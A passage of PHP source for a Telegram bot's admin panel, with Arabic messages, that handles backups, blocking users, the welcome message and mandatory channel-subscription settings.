        [['text'=>'رجوع','callback_data'=>"backsup"]],
	]
	])
    ]);
	bot("senddocument",[
        'chat_id' => $chat_id,
		'document' => new CURLFile($member_name),
        'caption' => "
- ملف الاعضاء
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,

    ]);
	bot("senddocument",[
        'chat_id' => $chat_id,
		'document' => new CURLFile($chanel_name),
        'caption' => "
- ملف القنوات
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,

    ]);
	bot("senddocument",[
        'chat_id' => $chat_id,
		'document' => new CURLFile($group_name),
        'caption' => "
- ملف الكروبات
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,

    ]);
	die();
}
if($data == 'del_blocks'){
    bot('answerCallbackQuery',[ 
        'callback_query_id'=>$update->callback_query->id, 
        'text'=>"
• تم مسح المحظورين بنجاح .
", 
        'show_alert'=>false
        ]); 
        unset($blockers);
        file_put_contents("$blockers_name",json_encode($blockers));
        bot("editmessagetext",[
            'chat_id' => $chat_id,
            "message_id"=>$message_id,
            'text' => "
    مرحبا بك في قسم الاحصائيات 📊 
    
    • عدد المسخدمين الكلي : $all | $s_all
    - عدد المستخدمين في الخاص : $privates
    - عدد الكروبات والقنوات : $groupes
    - عدد القنوات : $chanel_get
    - عدد الكروبات : $group_get
            
    • عدد المحظورين : 0
            
    • عدد المتفاعلين اليوم : $online_fiday
            
    - قائمة اخر الاعضاء الذين شتركوا :
$ns
        ",
        'parse_mode' => 'MaRKDOWN',
                        'reply_to_message_id' => $message_id,
        
    'reply_markup'=>json_encode([ 
        'inline_keyboard'=>[
            [['text'=>'مسح المحظورين','callback_data'=>"del_blocks"]],
            [['text'=>'حظر شخص','callback_data'=>"block_person"],['text'=>'الغاء حظر شخص','callback_data'=>"unblock_person"]],
            [['text'=>'قسم الاذاعه','callback_data'=>"broadcast"]],
			[['text'=>'قسم النسخ الاحتياطيه','callback_data'=>"backsup"]],
            [['text'=>'رجوع','callback_data'=>"paneel"]],
        ]
        ])
        ]);
    
}


if($data == 'unblock_person'){
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
- ارسل ايدي الشخص او معرف الشخص لكي اقوم بالغاء حظره من البوت
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"statebot"]],
	]
	])
    ]);
    $modes[$from_id] = $data;
    file_put_contents("$mode_name",json_encode($modes));
}


if($text and $modes[$from_id] == 'unblock_person'){
    if($blockers[$text] == true){
    bot("SendMessage",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• تم الغاء الحظر عن المستخدم بنجاح
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"statebot"]],
	]
	])
    ]);
    unset($blockers[$text]);
    file_put_contents("$blockers_name",json_encode($blockers));

    unset($modes[$from_id]);
    file_put_contents("$mode_name",json_encode($modes));
}else{
    bot("SendMessage",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• المستخدم غير محظور بالفعل !
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"statebot"]],
	]
	])
    ]);
    unset($modes[$from_id]);
    file_put_contents("$mode_name",json_encode($modes));
}
}

if($data == 'block_person'){
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
- ارسل ايدي الشخص او معرف الشخص لكي اقوم بحظره من البوت
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"statebot"]],
	]
	])
    ]);
    $modes[$from_id] = $data;
    file_put_contents("$mode_name",json_encode($modes));
}

if($text and $modes[$from_id] == 'block_person'){
    if($blockers[$text] != true){
    bot("SendMessage",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• تم حظر المستخدم بنجاح
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"statebot"]],
	]
	])
    ]);
    $blockers[$text] = true;
    file_put_contents("$blockers_name",json_encode($blockers));

    unset($modes[$from_id]);
    file_put_contents("$mode_name",json_encode($modes));
}else{
    bot("SendMessage",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• المستخدم محظور من قبل !
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"statebot"]],
	]
	])
    ]);
    unset($modes[$from_id]);
    file_put_contents("$mode_name",json_encode($modes));
}
}


if($data == "del_start"){
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• تم مسح رساله start والرجوع الى الرساله الاصلية !
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"startmsg"]],
	]
	])
    ]);
    unset($start_sock["msg"]);
    file_put_contents("$start_name",json_encode($start_sock));
}

if($data == "set_start"){
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• ارسال الان الكليشه .

- يمكنك وضع بعض الاضافات الى كليشه الstart من خلال استخدام الاهاشتاكات التاليه :
[    
1. #name_user : لوضع اسم شخص ووضع معرفه داخل اسمه 
2. #username : لوضع اسم مستخدم الشخص مع اضافه @ 
3. #name : لوضع اسم الشخص
4. #id : لوضع ايدي الشخص 
5. #coins لعرض عدد نقاط الشخص
6. #tlbs لعرض عدد طلبات البوت
7. #shares لعرض عدد مشاركات الرابط
8. #xtlb لعرض عدد طلبات الشخص
    ]  
يمكنك تعين نص ماركداون في البوت , عند كتابه معرف قناتك او معرفك قم بوضع [] بين المعرف .
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"startmsg"]],
	]
	])
    ]);
$modes[$from_id] = $data;
file_put_contents("$mode_name",json_encode($modes));
}

if($text and $modes[$from_id] == 'set_start'){
    bot("sendmessage",[
        'chat_id' => $chat_id,
        'text' => "
• مثال على الرساله : 

$text
        ",
        'parse_mode' => 'MaRKDOWN',
                        'reply_to_message_id' => $message_id,
    ]);
    bot("sendmessage",[
        'chat_id' => $chat_id,
        'text' => "
• تم الحفظ بنجاح
        ",
        'parse_mode' => 'MaRKDOWN',
                        'reply_to_message_id' => $message_id,
                           
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"startmsg"]],
	]
	])
    ]);
    $start_sock["msg"] = $text;
    file_put_contents("$start_name",json_encode($start_sock));
    unset($modes[$from_id]);
file_put_contents("$mode_name",json_encode($modes));
}

if($data == "paneel"){
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• اهلا بك في لوحه الأدمن الخاصه بالبوت 🤖

- يمكنك التحكم في البوت الخاص بك من هنا
~~~~~~~~~~~~~~~~~
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'أخر تحديثات البوت 🛍','url'=>"https://t.me/SeroMaker"]],
        [['text'=>'عمل البوت','callback_data'=>"botstat"],['text'=>'اشعار الدخول : '. $tasks['notife'] ,'callback_data'=>"tasks_notife"]],
        [['text'=>'الردود','callback_data'=>"rdod"],['text'=>'تعديل الازرار','callback_data'=>"azrars"],['text'=>'توجيه الرسائل','callback_data'=>"frdrs"]],
        [['text'=>'رساله الترحيب (start)','callback_data'=>"startmsg"]],
        [['text'=>'قسم الاشتراك الاجباري','callback_data'=>"shtraks"],['text'=>'قسم الأدمنيه','callback_data'=>"admins_bot"]],
        [['text'=>'قسم الاذاعه','callback_data'=>"broadcast"],['text'=>'قسم الأحصائيات','callback_data'=>"statebot"]],
		[['text'=>'اعدادات البوت','callback_data'=>"rshqG"]],
	]
	])
    ]);
    unset($modes[$from_id]);
unset($modes['rd'][$from_id]);
file_put_contents("$mode_name",json_encode($modes));

unset($zr['mode']);
    
$zr = json_encode($zr,true);
file_put_contents("FCZR/". X_. "/zr.json",$zr);
die();
}


if($data == "strak_3"){

    $sh_ms = $shtrak['bot']['link'];
    if($sh_ms == null){
        $sh_ms = 'لايوجد';
    }

    $msg_whm = $shtrak['bot']['msg'];
    if($msg_whm == null){
$msg_whm = "
🚸| عذرا عزيزي
🔰| عليك الاشتراك بالبوت لتتمكن من استخدامه

- $sh_ms

‼️| اشترك في البوت من ثم ارسل /start

.
";
    }  
bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• مرحبا بك في قسم الاشتراك الاجباري 💫

- رابط البوت : [$sh_ms]
- رساله الاشتراك الاساسية : `$msg_whm`
        
‼️| اشترك في البوت من ثم ارسل /start
        
- يمكنك تعين نوع الاشتراك الاجباري من خلال الضغط 'نوع الاشتراك الاجباري'
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'تعيين البوت','callback_data'=>"set_bot"],['text'=>'مسح الاشتراك','callback_data'=>"del_bot"]],
        [['text'=>'تعيين رساله الاشتراك الاجباري','callback_data'=>"setmsg_bot"]],
        [['text'=>'قسم الاشتراك الثانوي','callback_data'=>"second_ch"]],
        [['text'=>'نوع الاشتراك الاجباري : بوت','callback_data'=>"shtraks"]],
        [['text'=>'رجوع','callback_data'=>"paneel"]],
	]
	])
    ]);
    unset($modes[$from_id]);
unset($modes['rd'][$from_id]);
file_put_contents("$mode_name",json_encode($modes));

unset($zr['mode']);
    
$zr = json_encode($zr,true);
file_put_contents("FCZR/". X_. "/zr.json",$zr);
die();
}

#ms_bot


if($data == "setmsg_bot"){

    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• ارسل كليشه الاشتراك مع رابط البوت الذي قمت بتعينه .
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'الرجوع للكليشه الاساسيه !!','callback_data'=>"delmsg_bot"]],
        [['text'=>'رجوع','callback_data'=>"strak_3"]],
	]
	])
    ]);
$modes[$from_id] = $data;
file_put_contents("$mode_name",json_encode($modes));
die();
}

if($data == "delmsg_bot"){

    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• تم الرجوع الى الكليشه الاساسيه .
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"strak_3"]],
	]
	])
    ]);
unset($shtrak['bot']['msg']);
file_put_contents("$shtrak_name",json_encode($shtrak));
die();
}

if($text and $modes[$from_id] == 'setmsg_bot'){
    bot("sendmessage",[
        'chat_id' => $chat_id,
        'text' => "
• تم الحفظ بنجاح
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"strak_3"]],
	]
	])
    ]);
    $shtrak['bot']['msg'] = $text;
file_put_contents("$shtrak_name",json_encode($shtrak));

unset($modes[$from_id]);
file_put_contents("$mode_name",json_encode($modes));
}

if($data == "del_bot"){

    $sh_ms = $shtrak['bot']['link'];
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• تم مسح وتعطيل الاشتراك الاجباري !
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"strak_3"]],
	]
	])
    ]);
    if($sh_ms != null){
unset($shtrak['bot']['link']);
file_put_contents("$shtrak_name",json_encode($shtrak));

unset($helper['bot'][$sh_ms]);
file_put_contents("$helper_name",json_encode($helper));
    }
die();
}

if($data == "set_bot"){

    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• ارسل معرف البوت ( يجب ان يكون مع @ !! )
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"strak_3"]],
	]
	])
    ]);
$modes[$from_id] = $data;
file_put_contents("$mode_name",json_encode($modes));
die();
}

if($text and $modes[$from_id] == 'set_bot'){
    if(preg_match("/@/",$text)){
    bot("sendmessage",[
        'chat_id' => $chat_id,
        'text' => "
• تم الحفظ بنجاح
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"strak_3"]],
	]
	])
    ]);
    $shtrak['bot']['link'] = $text;
file_put_contents("$shtrak_name",json_encode($shtrak));

unset($modes[$from_id]);
file_put_contents("$mode_name",json_encode($modes));
}
}


#end bot


if($data == "strak_2"){

    $sh_ms = $shtrak['socail']['link'];
    if($sh_ms == null){
        $sh_ms = 'لايوجد';
    }

    $msg_whm = $shtrak['socail']['msg'];
    if($msg_whm == null){
$msg_whm = "
    🚸| عذرا عزيزي
🔰| عليك متابعه حسابي
        
- $sh_ms
        
‼️| تابعني من ثم ارسل /start
        
.

";
    }  
bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• مرحبا بك في قسم الاشتراك الاجباري 💫

- رابط الحساب : [$sh_ms]
- رساله الاشتراك الاساسية : `$msg_whm`
        
- يمكنك تعين نوع الاشتراك الاجباري من خلال الضغط 'نوع الاشتراك الاجباري'
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'تعيين رابط الحساب','callback_data'=>"sestlink"],['text'=>'مسح الاشتراك','callback_data'=>"dellink"]],
        [['text'=>'تعيين رساله الاشتراك الاجباري','callback_data'=>"setmsg_1"]],
        [['text'=>'قسم الاشتراك الثانوي','callback_data'=>"second_ch"]],
        [['text'=>'نوع الاشتراك الاجباري : حساب سوشيال ميديا','callback_data'=>"strak_3"]],
        [['text'=>'رجوع','callback_data'=>"paneel"]],
	]
	])
    ]);
    unset($modes[$from_id]);
unset($modes['rd'][$from_id]);
file_put_contents("$mode_name",json_encode($modes));

unset($zr['mode']);
    
$zr = json_encode($zr,true);
file_put_contents("FCZR/". X_. "/zr.json",$zr);
die();
}

if($data == "setmsg_1"){

    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• ارسل كليشه الاشتراك مع رابط حسابك الذي قمت بتعينه .
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'الرجوع للكليشه الاساسيه !!','callback_data'=>"delmsg_1"]],
        [['text'=>'رجوع','callback_data'=>"strak_2"]],
	]
	])
    ]);
$modes[$from_id] = $data;
file_put_contents("$mode_name",json_encode($modes));
die();
}

if($data == "delmsg_1"){

    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• تم الرجوع الى الكليشه الاساسيه .
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"strak_2"]],
	]
	])
    ]);
unset($shtrak['socail']['msg']);
file_put_contents("$shtrak_name",json_encode($shtrak));
die();
}

if($text and $modes[$from_id] == 'setmsg_1'){
    bot("sendmessage",[
        'chat_id' => $chat_id,
        'text' => "
• تم الحفظ بنجاح
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"strak_2"]],
	]
	])
    ]);
    $shtrak['socail']['msg'] = $text;
file_put_contents("$shtrak_name",json_encode($shtrak));

unset($modes[$from_id]);
file_put_contents("$mode_name",json_encode($modes));
}

if($data == "dellink"){

    $sh_ms = $shtrak['socail']['link'];
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• تم مسح وتعطيل الاشتراك الاجباري !
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"strak_2"]],
	]
	])
    ]);
    if($sh_ms != null){
unset($shtrak['socail']['link']);
file_put_contents("$shtrak_name",json_encode($shtrak));

unset($helper[$sh_ms]);
file_put_contents("$helper_name",json_encode($helper));
    }
die();
}

if($data == "sestlink"){

    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• ارسل رابط حسابك في اي موقع من مواقع التواصل الاجتماعي .
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"strak_2"]],
	]
	])
    ]);
$modes[$from_id] = $data;
file_put_contents("$mode_name",json_encode($modes));
die();
}

if($text and $modes[$from_id] == 'sestlink'){
    bot("sendmessage",[
        'chat_id' => $chat_id,
        'text' => "
• تم الحفظ بنجاح
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'رجوع','callback_data'=>"strak_2"]],
	]
	])
    ]);
    $shtrak['socail']['link'] = $text;
file_put_contents("$shtrak_name",json_encode($shtrak));

unset($modes[$from_id]);
file_put_contents("$mode_name",json_encode($modes));
}

if($data == "shtraks"){
    $ch_shtrak =  $shtrak['CHANNEL_ASAS'];
    if(preg_match("/@/",$ch_shtrak)){
        $ch_shtrak = $ch_shtrak;
    }elseif(preg_match("/-/",$ch_shtrak)){
        if($shtrak['linker'][$ch_shtrak] == null){
        $ch_shtrak = bot("exportChatInviteLink",['chat_id'=>$ch_shtrak])->result;
        $shtrak['linker'][$shtrak['CHANNEL_ASAS']] = $ch_shtrak;
        file_put_contents("$shtrak_name",json_encode($shtrak));
        }else{
            $ch_shtrak = $shtrak['linker'][$ch_shtrak];
        }
    }else{
        $ch_shtrak = "لايوجد";
    }

    $msg_shtrak = $shtrak['MSG_CHANNEL_ASAS'];
    if($msg_shtrak == null){
        $msg_shtrak = "
🚸| عذرا عزيزي
🔰| عليك الاشتراك بقناة البوت لتتمكن من استخدامه
        
- $ch_shtrak
        
 ‼️| اشترك ثم ارسل /start
        
.
        
        ";
    }

    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• مرحبا بك في قسم الاشتراك الاجباري 💫

- قناة الاشتراك الاساسية : `$ch_shtrak`
- رساله الاشتراك الاساسية : `$msg_shtrak`
        
- وضع الاداء : يقوم بتحقق من اشتراك الشخص في رساله /start فقط 
- يمكنك تعين نوع الاشتراك الاجباري من خلال الضغط 'نوع الاشتراك الاجباري'
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'تعيين القناة','callback_data'=>"sestch"],['text'=>'مسح القناة','callback_data'=>"delch"]],
        [['text'=>'تعيين رساله الاشتراك الاجباري','callback_data'=>"shmsg"]],
        [['text'=>'وضع الاداء : ' . $shtrak["start"],'callback_data'=>"shtrak_start"],['text'=>'اشعار الاشتراك : ' . $shtrak["notife"],'callback_data'=>"shtrak_notife"]],
        [['text'=>'ازرار شفافه : ' . $shtrak["inline"],'callback_data'=>"shtrak_inline"],['text'=>'ماركداون : ' . $shtrak["markdown"],'callback_data'=>"shtrak_markdown"]],
        [['text'=>'زر التحقق من الاشتراك : ' . $shtrak["check"],'callback_data'=>"shtrak_check"]],
        [['text'=>'قسم الاشتراك الثانوي','callback_data'=>"second_ch"]],
        [['text'=>'نوع الاشتراك الاجباري : قناة تيليكرام','callback_data'=>"strak_2"]],
        [['text'=>'رجوع','callback_data'=>"paneel"]],
	]
	])
    ]);
    unset($modes[$from_id]);
unset($modes['rd'][$from_id]);
file_put_contents("$mode_name",json_encode($modes));

unset($zr['mode']);
    
$zr = json_encode($zr,true);
file_put_contents("FCZR/". X_. "/zr.json",$zr);
die();
}


if($data == "shtraks"){
    $ch_shtrak =  $shtrak['CHANNEL_ASAS'];
    if(preg_match("/@/",$ch_shtrak)){
        $ch_shtrak = $ch_shtrak;
    }elseif(preg_match("/-/",$ch_shtrak)){
        if($shtrak['linker'][$ch_shtrak] == null){
        $ch_shtrak = bot("exportChatInviteLink",['chat_id'=>$ch_shtrak])->result;
        $shtrak['linker'][$shtrak['CHANNEL_ASAS']] = $ch_shtrak;
        file_put_contents("$shtrak_name",json_encode($shtrak));
        }else{
            $ch_shtrak = $shtrak['linker'][$ch_shtrak];
        }
    }else{
        $ch_shtrak = "لايوجد";
    }

    $msg_shtrak = $shtrak['MSG_CHANNEL_ASAS'];
    if($msg_shtrak == null){
        $msg_shtrak = "
🚸| عذرا عزيزي
🔰| عليك الاشتراك بقناة البوت لتتمكن من استخدامه
        
- $ch_shtrak
        
 ‼️| اشترك ثم ارسل /start
        
.
        
        ";
    }

    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• مرحبا بك في قسم الاشتراك الاجباري 💫

- قناة الاشتراك الاساسية : `$ch_shtrak`
- رساله الاشتراك الاساسية : `$msg_shtrak`
        
- وضع الاداء : يقوم بتحقق من اشتراك الشخص في رساله /start فقط 
- يمكنك تعين نوع الاشتراك الاجباري من خلال الضغط 'نوع الاشتراك الاجباري'
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode([ 
	'inline_keyboard'=>[
        [['text'=>'تعيين القناة','callback_data'=>"sestch"],['text'=>'مسح القناة','callback_data'=>"delch"]],
        [['text'=>'تعيين رساله الاشتراك الاجباري','callback_data'=>"shmsg"]],
        [['text'=>'وضع الاداء : ' . $shtrak["start"],'callback_data'=>"shtrak_start"],['text'=>'اشعار الاشتراك : ' . $shtrak["notife"],'callback_data'=>"shtrak_notife"]],
        [['text'=>'ازرار شفافه : ' . $shtrak["inline"],'callback_data'=>"shtrak_inline"],['text'=>'ماركداون : ' . $shtrak["markdown"],'callback_data'=>"shtrak_markdown"]],
        [['text'=>'زر التحقق من الاشتراك : ' . $shtrak["check"],'callback_data'=>"shtrak_check"]],
        [['text'=>'قسم الاشتراك الثانوي','callback_data'=>"second_ch"]],
        [['text'=>'نوع الاشتراك الاجباري : قناة تيليكرام','callback_data'=>"strak_1"]],
        [['text'=>'رجوع','callback_data'=>"paneel"]],
	]
	])
    ]);
    unset($modes[$from_id]);
unset($modes['rd'][$from_id]);
file_put_contents("$mode_name",json_encode($modes));

unset($zr['mode']);
    
$zr = json_encode($zr,true);
file_put_contents("FCZR/". X_. "/zr.json",$zr);
die();
}

if($data == "second_ch"){
    $Lr = ['inline_keyboard' => []];
    foreach ($shtrak['CHANNELS'] as $chs){
        $u = array_search($chs , $shtrak['CHANNELS']);
        if($chs != "start"){
            $Lr['inline_keyboard'][] =  [['text'=>"$chs",'callback_data'=>"control_$u"],['text'=>'🗑','callback_data'=>"delch_$u"]];
        }
    }
        $Lr['inline_keyboard'][] =  [['text'=>'اضافه قناة جديده','callback_data'=>"add_chanell"]];
        $Lr['inline_keyboard'][] =  [['text'=>'رجوع','callback_data'=>"shtraks"]];
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• مرحبا بك في قسم الاشتراك الاجباري الثانوي ⚙️

- يمكنك وضع 5 قنوات فقط 
        
- الاشتراك سيظهر عند ضغط /start فقط لكي لا يؤثر على عمل البوت 
ستظهر قناة الاشتراك الاساسية اولا !
        
- اضغط على القناة لتعديل رساله الاشتراك الاجباري او تعين عدد المستخدمين المطلوب.
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
    
'reply_markup'=>json_encode($Lr)
    ]);
    unset($modes[$from_id]);
unset($modes['rd'][$from_id]);
file_put_contents("$mode_name",json_encode($modes));
unset($zr['mode']);
$zr = json_encode($zr,true);
file_put_contents("FCZR/". X_. "/zr.json",$zr);
die();
}


$Le = explode("control_",$data)[1];

if($Le){

$output = $shtrak['CHANNELS'][$Le];
if(preg_match("/-/",$output)){
$ch_shtrak = $output;
    if(preg_match("/@/",$ch_shtrak)){
        $ch_shtrak = $ch_shtrak;
    }elseif(preg_match("/-/",$ch_shtrak)){
        if($shtrak['linker'][$ch_shtrak] == null){
        $ch_shtrak = bot("exportChatInviteLink",['chat_id'=>$ch_shtrak])->result;
        $shtrak['linker'][$shtrak['CHANNEL_ASAS']] = $ch_shtrak;
        file_put_contents("$shtrak_name",json_encode($shtrak));
        }else{
            $ch_shtrak = $shtrak['linker'][$ch_shtrak];
        }
    }else{
        $ch_shtrak = "لايوجد";
    }

}else{
    $ch_shtrak = $output;
}

$msg_sh = $shtrak["info"][$Le]['msg'];
if($msg_sh == null){
    $msg_sh = "
🚸| عذرا عزيزي
🔰| عليك الاشتراك بقناة البوت لتتمكن من استخدامه
        
- $ch_shtrak
        
 ‼️| اشترك ثم ارسل /start
        
.
    ";
}
$ineed = $shtrak["info"][$Le]['cc'] ?? "0";
$doneneed = $shtrak["info"][$Le]['doneneed'] ?? "0";
if($ineed == null){
    $ineed = 0;
}
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• القناة : [$ch_shtrak]

• عدد المشتركين المطلوب : $ineed
        
• تم الدخول : $doneneed
        
• رساله الاشتراك : 
`$msg_sh`
        
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
 
                    'reply_markup'=>json_encode([ 
                        'inline_keyboard'=>[
                            [['text'=>'تعيين رساله الاشتراك الاجباري','callback_data'=>"setsh_$Le"]],
                            [['text'=>'الرجوع للكليشه الاساسيه','callback_data'=>"delsh_$Le"]],
                            [['text'=>'تعيين العدد المطلوب','callback_data'=>"counts_$Le"]],
                            [['text'=>'رجوع','callback_data'=>"second_ch"]],
                        ]
                        ])
    ]);
}

$Le = explode("delsh_",$data)[1];

if($Le){
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• تم مسح كليشه الاشتراك ورجوع الى الكليشة الاساسية .
        
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
 
                    'reply_markup'=>json_encode([ 
                        'inline_keyboard'=>[
                            [['text'=>'رجوع','callback_data'=>"control_$Le"]],
                        ]
                        ])
    ]);
    unset($shtrak["info"][$Le]['msg']);
file_put_contents("$shtrak_name",json_encode($shtrak));
}

$Le = explode("setsh_",$data)[1];

if($Le){
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• ارسل كليشه الاشتراك الان .
        
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
 
                    'reply_markup'=>json_encode([ 
                        'inline_keyboard'=>[
                            [['text'=>'الرجوع للكليشه الاساسيه','callback_data'=>"delsh_$Le"]],
                            [['text'=>'رجوع','callback_data'=>"control_$Le"]],
                        ]
                        ])
    ]);
    $modes[$from_id] = "set_sh";
    $modes['helper'][$from_id] = $Le;
file_put_contents("$mode_name",json_encode($modes));
}


$Le = explode("counts_",$data)[1];

if($Le){
    bot("editmessagetext",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
 • ارسل عدد المشتركين المطلوب .
        
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
 
                    'reply_markup'=>json_encode([ 
                        'inline_keyboard'=>[
                            [['text'=>'رجوع','callback_data'=>"control_$Le"]],
                        ]
                        ])
    ]);
    $modes[$from_id] = "set_CC";
    $modes['helper'][$from_id] = $Le;
file_put_contents("$mode_name",json_encode($modes));
}

if($text and $modes[$from_id] == "set_CC"){
    $Le = $modes['helper'][$from_id];
    bot("sendmessage",[
        'chat_id' => $chat_id,
        "message_id"=>$message_id,
        'text' => "
• تم الحفظ بنجاح
        
    ",
    'parse_mode' => 'MaRKDOWN',
                    'reply_to_message_id' => $message_id,
 
                    'reply_markup'=>json_encode([ 
                        'inline_keyboard'=>[
                            [['text'=>'رجوع','callback_data'=>"control_$Le"]],
                        ]
                        ])
    ]);
    unset($modes[$from_id]);
    unset($modes[$from_id]['helper']);
file_put_contents("$mode_name",json_encode($modes));

